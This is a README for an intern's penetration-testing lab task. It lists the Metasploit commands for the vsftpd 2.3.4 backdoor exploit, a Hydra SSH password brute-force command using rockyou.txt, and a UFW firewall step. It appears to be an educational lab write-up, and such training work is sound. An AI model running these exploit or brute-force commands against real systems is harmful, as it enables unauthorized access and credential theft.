# ApexPlanet-Task4-SystemSecurity
# ApexPlanet Task-4: Exploitation & System Security

## Overview
This task demonstrates penetration testing and system security techniques using Kali Linux.

---

## Tools Used
- Kali Linux
- Metasploit Framework
- Hydra
- UFW Firewall

---

## 1. Penetration Testing Methodology

Steps followed:
- Reconnaissance
- Scanning
- Exploitation
- Post-Exploitation
- Reporting

---

## 2. Exploitation using Metasploit

Commands used:

msfconsole  
search vsftpd  
use exploit/unix/ftp/vsftpd_234_backdoor  
set RHOST <target_ip>  
run  

After exploitation:

whoami  
sysinfo  

### Screenshot
![Metasploit](screenshots/metasploit_exploit.png)

---

## 3. Password Attack

Used Hydra tool:

hydra -l msfadmin -P rockyou.txt ssh://<target_ip>

### Screenshot
![Hydra](screenshots/hydra_attack.png)

---

## 4. System Hardening

Enabled firewall:

sudo ufw enable  

### Screenshot
![Firewall](screenshots/firewall_enabled.png)

---

## Conclusion
This task helped in understanding exploitation techniques and how to secure systems against attacks.

---

## Author
Sowmya  
Cybersecurity Intern  
ApexPlanet
